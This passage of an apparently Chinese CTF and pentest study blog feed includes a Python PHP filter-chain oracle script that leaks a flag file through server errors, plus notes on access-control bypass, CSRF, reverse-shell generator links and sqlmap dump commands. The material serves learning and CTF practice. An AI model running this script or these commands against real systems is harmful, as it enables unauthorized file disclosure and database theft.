punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># g</span><span class="token keyword">return</span> <span class="token string">'g'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># G</span><span class="token keyword">return</span> <span class="token string">'G'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># t</span><span class="token keyword">return</span> <span class="token string">'t'</span><span class="token keyword">elif</span> <span class="token keyword">not</span> req<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>prefix<span class="token punctuation">&#125;</span></span><span class="token string">|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>blow_up_inf<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># T</span><span class="token keyword">return</span> <span class="token string">'T'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'something wrong'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>letter <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token comment"># it's a number! check base64</span><span class="token keyword">if</span> letter <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">:</span>prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode'</span></span>s <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token keyword">if</span> s <span class="token operator">==</span> <span class="token string">'M'</span><span class="token punctuation">:</span><span class="token comment"># 0 - 3</span>prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>ss <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token keyword">if</span> ss <span class="token keyword">in</span> <span class="token string">'CDEFGH'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'0'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'STUVWX'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'1'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'ijklmn'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'2'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'yz*'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'3'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bad num (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ss<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span><span class="token keyword">elif</span> s <span class="token operator">==</span> <span class="token string">'N'</span><span class="token punctuation">:</span><span class="token comment"># 4 - 7</span>prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>ss <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token keyword">if</span> ss <span class="token keyword">in</span> <span class="token string">'CDEFGH'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'4'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'STUVWX'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'5'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'ijklmn'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'6'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'yz*'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'7'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bad num (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ss<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span><span class="token keyword">elif</span> s <span class="token operator">==</span> <span class="token string">'O'</span><span class="token punctuation">:</span><span class="token comment"># 8 - 9</span>prefix <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>header<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>get_nth<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">|convert.base64-encode|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>r2<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>ss <span class="token operator">=</span> find_letter<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token keyword">if</span> ss <span class="token keyword">in</span> <span class="token string">'CDEFGH'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'8'</span><span class="token keyword">elif</span> ss <span class="token keyword">in</span> <span class="token string">'STUVWX'</span><span class="token punctuation">:</span>letter <span class="token operator">=</span> <span class="token string">'9'</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bad num (</span><span class="token interpolation"><span class="token punctuation">&#123;</span>ss<span class="token punctuation">&#125;</span></span><span class="token string">)'</span></span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>err<span class="token punctuation">(</span><span class="token string">'wtf'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">=</span>letter<span class="token punctuation">)</span>o <span class="token operator">+=</span> lettersys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">"""We are done!! :)"""</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>d <span class="token operator">=</span> b64decode<span class="token punctuation">(</span>o<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'='</span> <span class="token operator">*</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token comment"># remove KR padding</span>d <span class="token operator">=</span> d<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'$)C'</span><span class="token punctuation">,</span><span class="token string">b''</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64decode<span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  首先，通过构造特定的过滤器链，在HTTP请求中注入不同的字符和过滤器</p></li><li><p>  如果在应用过滤器链后服务器返回500错误，那么可以推断出该字符在flag文件中，因为服务器在某些条件下无法正确处理该输入，从而导致错误</p></li><li><p>  根据服务器的响应，可以逐个判断flag文件中的字符</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通用漏洞&amp;业务逻辑漏洞&amp;水平垂直越权漏洞</title>
      <link href="/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/"/>
      <url>/%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E&amp;%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E&amp;%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="权限图"><a href="#权限图" class="headerlink" title="权限图"></a>权限图</h1><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707162615.png"></p><h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><ol><li>  <strong>用户信息获取时未对用户与用户ID比较判断直接查询等</strong></li><li>  同级用户权限共享</li><li>  用户A的查看到具有相同权限的用户B才可以查看到的文件</li></ol><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol><li>  在用户登录时就获取用户的ID值等信息，进行每一次操作时都要比较是否是同一个ID值</li><li>  用户A只能操作用户A及其文件，不能操作其它用户及其文件</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><ol><li>  用某用户登录，抓包（这里是修改用户对应的值）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707164610.png"></li><li>  修改对应的值后，forward发出这个包</li><li>  发现成功修改</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707164828.png"></li><li>  这个案例就是用A用户的权限去进行同权限用户的信息的水平越权漏洞</li></ol><h1 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h1><ol><li>  数据库中用户类型编号接收篡改或高权限操作未验证等</li><li>  低高用户权限共享</li><li>  低权限看到了高权限的东西</li></ol><h3 id="问题在哪里"><a href="#问题在哪里" class="headerlink" title="问题在哪里"></a>问题在哪里</h3><ol><li>  没有验证 触发当前操作的用户权限</li><li>  有验证 逻辑顺序搞错了</li></ol><h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><ol><li>  以游客的身份，触发（发送）了管理员的数据包，从而进行了管理员的操作，垂直越权</li><li>  首先，文章管理站有1111文章，并已发布</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171704.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171746.png"></li><li>  复制回收操作的链接地址</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171824.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707171937.png"></li><li>  现在以没有登录的身份，去请求回收的链接地址</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230707172038.png"></li><li>  发现文章删除</li></ol><h1 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h1><h2 id="验证丢失"><a href="#验证丢失" class="headerlink" title="验证丢失"></a>验证丢失</h2><ol><li>  未包含引用验证代码文件等</li></ol><h2 id="取消验证"><a href="#取消验证" class="headerlink" title="取消验证"></a>取消验证</h2><ol><li>  支持空口令、匿名、白名单等</li></ol><h1 id="脆弱验证-Cookie-amp-Token-amp-Jwt等"><a href="#脆弱验证-Cookie-amp-Token-amp-Jwt等" class="headerlink" title="脆弱验证-Cookie&amp;Token&amp;Jwt等"></a>脆弱验证-Cookie&amp;Token&amp;Jwt等</h1>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell_生成payload、各种八股文术语</title>
      <link href="/%E5%8F%8D%E5%BC%B9shell_%E7%94%9F%E6%88%90payload/"/>
      <url>/%E5%8F%8D%E5%BC%B9shell_%E7%94%9F%E6%88%90payload/</url>
      
        <content type="html"><![CDATA[<h1 id="在线生成payload网站"><a href="#在线生成payload网站" class="headerlink" title="在线生成payload网站"></a>在线生成payload网站</h1><h2 id="文件下载命令生成"><a href="#文件下载命令生成" class="headerlink" title="文件下载命令生成"></a>文件下载命令生成</h2><p>[<a href="https://forum.ywhack.com/bountytips.php?download">~]#棱角 ::Edge.Forum* (ywhack.com)</a></p><h2 id="反弹shell命令生成器"><a href="#反弹shell命令生成器" class="headerlink" title="反弹shell命令生成器"></a>反弹shell命令生成器</h2><p><a href="https://forum.ywhack.com/reverse-shell/">反弹shell生成器 (ywhack.com)</a></p><h1 id="八股文术语"><a href="#八股文术语" class="headerlink" title="八股文术语"></a>八股文术语</h1><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html">渗透测试常用术语总结 - 11阳光 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSRF&amp;SSRF漏洞</title>
      <link href="/CSRF&amp;SSRF%E6%BC%8F%E6%B4%9E/"/>
      <url>/CSRF&amp;SSRF%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF漏洞是什么"><a href="#CSRF漏洞是什么" class="headerlink" title="CSRF漏洞是什么"></a>CSRF漏洞是什么</h1><ol><li>  CSRF 全称：Cross-site request forgery，即，跨站请求伪造，也被称为 “One  Click Attack” 或 “Session Riding”，通常缩写为 CSRF 或者 XSRF，是一种对网 站的恶意利用。举个生活中的例子：就是某个人点了个奇怪的链接，自己什么也没输，但 自己的 qq 号或其他的号就被盗了。即该攻击可以在受害者不知情的情况下以受害者名义 伪造请求，执行恶意操作，具有很大的危害性。 </li></ol><h1 id="CSRF漏洞条件"><a href="#CSRF漏洞条件" class="headerlink" title="CSRF漏洞条件"></a>CSRF漏洞条件</h1><ol><li>  目标用户已经登录了网站，有能够执行网站功能的权限</li><li>  有构造好的数据包：csrftester工具</li><li>  目标用户访问了攻击者构造的URL</li></ol><h1 id="黑盒测试判断以及修复建议"><a href="#黑盒测试判断以及修复建议" class="headerlink" title="黑盒测试判断以及修复建议"></a>黑盒测试判断以及修复建议</h1><ol><li>  判断来源是否相同:数据包的Refer头是请求来源的IP/域名地址的，但是修复不建议，因为可以通过抓包后用burp修改</li><li>  看凭据有无token，如果抓包后发现有token就可以放弃使用csrf进行攻击，token是进行前后端验证的，同一个用户，每一次的操作对应的token值是不同的，如果前后端校验token值不同，操作就无法执行</li><li>  看关键操作有无验证：安全码、验证码等</li></ol><h1 id="找内网地址"><a href="#找内网地址" class="headerlink" title="找内网地址"></a>找内网地址</h1><ol><li>  从三个网段下手：10.xxx 172.xxx 192.xxx  以上三个是内网的网段</li><li>  对最后两段进行爆破</li><li>  一般都会开放80端口，就扫某个IP地址的80端口通不通</li></ol><h1 id="CSRF实例"><a href="#CSRF实例" class="headerlink" title="CSRF实例"></a>CSRF实例</h1><ol><li>  本实例采用本人自行开发的项目，未开源</li><li>  启动csrftester，并设置监听</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230705165835.png"></li><li>  进行注册</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230705165610.png"></li><li>  抓到包后generate html，生成对应的html文件，修改对应的input参数</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230705170004.png"></li><li>  把改好的html文件上传到外网服务器上，这里我用的apache，就放到/var/www/html路径下即可</li><li>  访问（原理应该是被攻击者访问，这里我既作为攻击者，又作为被攻击者）</li><li>  有回显，进行跳转，证明攻击成功</li><li>  这里test2用户也成功添加，证明攻击成功</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20230705171343.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF常见杂项集合</title>
      <link href="/CTF%E6%9D%82%E9%A2%98%E9%9B%86%E5%90%88/"/>
      <url>/CTF%E6%9D%82%E9%A2%98%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF常见杂项集合"><a href="#CTF常见杂项集合" class="headerlink" title="CTF常见杂项集合"></a>CTF常见杂项集合</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到："><a href="#签到：" class="headerlink" title="签到："></a>签到：</h3><ol><li>010editor打开发现PK开头，知道是一个zip压缩包</li><li>更改后缀为.zip，解压打开发现flag</li></ol><h3 id="签到：-1"><a href="#签到：-1" class="headerlink" title="签到："></a>签到：</h3><ol><li>BASE85{6:”O=1GX;K8jQKJ;G(“;DhKL9h)S6;BsD:IJ&gt;[;HHmd9h[rJ1c/0%&lt;(g@i6&lt;6QU&lt;\d]P7RpNU:eETA&lt;BWK.4ZtrV}</li><li>BASE85解一层出base35</li><li><a href="https://imgtu.com/i/qwIiNQ"><img src="https://s1.ax1x.com/2022/03/27/qwIiNQ.png" alt="qwIiNQ.png"></a></li><li>再解一层给出微信id</li><li><a href="https://imgtu.com/i/qwIE3n"><img src="https://s1.ax1x.com/2022/03/27/qwIE3n.png" alt="qwIE3n.png"></a></li><li>微信加好友有备注即可获得flag</li></ol><h3 id="黑化的维亚"><a href="#黑化的维亚" class="headerlink" title="黑化的维亚"></a>黑化的维亚</h3><ol><li>用stegsolve打开，查看不同色域下的图片</li><li><a href="https://imgtu.com/i/qwIgDf"><img src="https://s1.ax1x.com/2022/03/27/qwIgDf.png" alt="qwIgDf.png"></a></li><li>找到flag的上一级（我一开始还以为这就是flag，提交不对）</li><li>后面看到!123和fkvd这么不规则但是又像flag的</li><li>后面尝试偏移量为0，1，2，3的栅栏密码，即可解得flag</li></ol><h3 id="0和1的故事"><a href="#0和1的故事" class="headerlink" title="0和1的故事"></a>0和1的故事</h3><ol><li>解压后里面有一个txt文件，打开后看最后发现有==，知道是base64解码</li><li><a href="https://imgtu.com/i/qwb2tO"><img src="https://s1.ax1x.com/2022/03/27/qwb2tO.png" alt="qwb2tO.png"></a></li><li>解码网站<a href="https://the-x.cn/base64/">https://the-x.cn/base64/</a></li><li>解码后发现里面有一个png文件，图片中全是01字符</li><li><a href="https://imgtu.com/i/qwbonI"><img src="https://s1.ax1x.com/2022/03/27/qwbonI.png" alt="qwbonI.png"></a></li><li>两种选择，一种是利用手机去扫描出文本，第二种是在linux环境下cat出01字符串</li><li>得到01字符一开始还以为是一个二进制文件或者是培根密码，然后我五位一解，（解出来的都是什么东西。。。）（培根密码是0为a，1为b，依此得出不同字符）</li><li>长和宽相同的情况下猜测是二维码，但是上学期学的py都被时间冲刷干净了，我就在网上找脚本，但是找到的因为MAXN设定的不同，无法得到正确的二维码（轻易改动数据，也会出现数组越界的segementation fault的问题）</li><li>后面用excel表格去做，将1所在的单元格填充为黑色，0所在的单元格填充为白色（可能出现的绿色不会影响二维码扫描）</li><li><a href="https://imgtu.com/i/qwbbAf"><img src="https://s1.ax1x.com/2022/03/27/qwbbAf.png" alt="qwbbAf.png"></a></li><li>扫描后即可得到flag{Stories_of_0_and_1}</li></ol><h2 id="web题"><a href="#web题" class="headerlink" title="web题"></a>web题</h2><h3 id="Robot"><a href="#Robot" class="headerlink" title="Robot"></a>Robot</h3><ol><li>上来一看什么也没有，就猜测是哪几种题型（反正不可能上来就是sql注入文件上传之类的，没有地方注入东西）</li><li>用御剑字典爆破后缀或者用spider去爬，发现有一个txt为后缀的，打开网页得到4ll.html</li><li>我一开始还以为是411，结果404就搁置了好久，最后有hint发布，“411和4ll真的能分清吗”，在hackbar中打开，给后缀，excute后给出I have tell you all的字符,还是没有什么东西</li><li>ctrl + u查看源代码发现flag</li><li>这里由于没有保留截图，也没有环境，暂无截图</li></ol><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><ol><li>我不知道给的那个hint是什么意思。。。</li><li>强大的工具一把梭，我sqlmap跑了好久都没有</li><li>这里浅谈一下我的思路吧</li><li>两个登录框，分别给出1，1，用burp抓包，发现是post包，post注入</li><li><a href="https://imgtu.com/i/qwLEIf"><img src="https://s1.ax1x.com/2022/03/27/qwLEIf.png" alt="qwLEIf.png"></a></li><li><a href="https://imgtu.com/i/qwLJiT"><img src="https://s1.ax1x.com/2022/03/27/qwLJiT.png" alt="qwLJiT.png"></a></li><li>sqlmap post注入的命令分别是：</li><li>sqlmap -r “admin.txt” –dbs (–level n)(默认为level 1)</li><li>sqlmap -r “admin.txt” -D xxx –tables</li><li>sqlmap -r “admin.txt” -D xxx -T xxx –columns</li><li>sqlmap -r “admin.txt” -D xxx –T xxx -C xxx –dump</li></ol><h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><ol><li>猪圈+银河骑士+圣殿+栅栏</li><li><a href="https://imgtu.com/i/qwL7Y8"><img src="https://s1.ax1x.com/2022/03/27/qwL7Y8.png" alt="qwL7Y8.png"></a></li></ol><h1 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h1><pre class="line-numbers language-none"><code class="language-none">来签个到吧！我把奖励放在这里了，手慢无。ZmxhZ3t3ZWxjb21ldG8xMDA4Nn0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>因为后面没有明显的==或者=，一开始没想到是base64，就把hex，之类的编码都试了试，试到base64借出flag</li><li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731171328.png"></li></ol><h1 id="凯撒加密"><a href="#凯撒加密" class="headerlink" title="凯撒加密"></a>凯撒加密</h1><pre class="line-numbers language-none"><code class="language-none">相传有一位大帝叫Caesar，他发明了一种神秘的编码，你能解开这段密文吗？密文内容：mshn&#123;jhlzhy_pz_mbuufek&#125;。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li>题目明显指出是凯撒加密，凯撒加密原理是偏移，1~26之间的字符偏移量</li><li>题目前面给的格式很像flag{},m和f之间的字节偏移量为7，即可得到flag<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731171636.png"></li></ol><h2 id="解编码和解古典密码学的网站"><a href="#解编码和解古典密码学的网站" class="headerlink" title="解编码和解古典密码学的网站"></a>解编码和解古典密码学的网站</h2><ol><li>cyberchef</li></ol><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;cyberchef.org&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>CTF在线工具</li></ol><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;www.hiencode.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h1><ol><li>黑客通过webshell往web服务器中写入了一串机密信息，你能找出机密信息吗</li><li>webshell后门，我有一个很奇怪的设想，如果不想配置ssh免密登录之类的，可以直接往服务器里丢一个后门，然后蚁剑去连就可以登录了，但是有被杀的风险</li><li>题目给了一个pcap文件，导入到wireshark中<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172317.png"></li><li>蓝帽杯让我知道，分析流量先分析http</li><li>根据题目描述，”webshell”,同时发现了很多上传的shell.php文件，那么就分析分析shell.php<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172458.png"></li><li>发现每一个shell.php中都上传一串base64,一个一个解密看看，右键可以复制可打印的字符<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172618.png"></li><li>发现有%编码，先解一层URL编码<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731172827.png"></li><li>再解一层base64，发现是木马，我们走对路了，继续一个一个地找<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731174212.png"></li><li>最后找着找着flag就出来了<br> <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220731174348.png"></li></ol><h1 id="buuctf神奇的二维码"><a href="#buuctf神奇的二维码" class="headerlink" 